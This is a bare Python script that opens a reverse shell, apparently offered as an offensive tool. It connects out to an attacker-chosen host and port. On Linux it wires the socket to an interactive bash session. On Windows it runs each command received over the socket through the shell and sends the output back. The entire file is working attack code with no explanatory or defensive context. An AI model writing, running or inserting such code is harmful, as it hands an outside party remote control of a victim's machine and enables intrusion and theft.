import socket, subprocess, os, sys, platform

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))

if platform.system() == 'Linux':
  os.dup2(sock.fileno(),0)
  os.dup2(sock.fileno(),1)
  os.dup2(sock.fileno(),2)
  proc = subprocess.run(['/bin/bash', '-i'])
elif platform.system() == 'Windows':
  while 1:
    sock.send(str.encode(os.getcwd() + '> '))
    data = sock.recv(1024).decode('UTF-8')
    data = data.strip('\n')
    if data == 'exit': 
      break
    elif data[:2] == 'cd':
      os.chdir(data[3:])
    elif len(data) > 0:
      proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
      stdout_value = proc.stdout.read() + proc.stderr.read()
      output_str = str(stdout_value, 'UTF-8')
      sock.send(str.encode("\n" + output_str))

proc.terminate()
proc.wait()
sock.close()
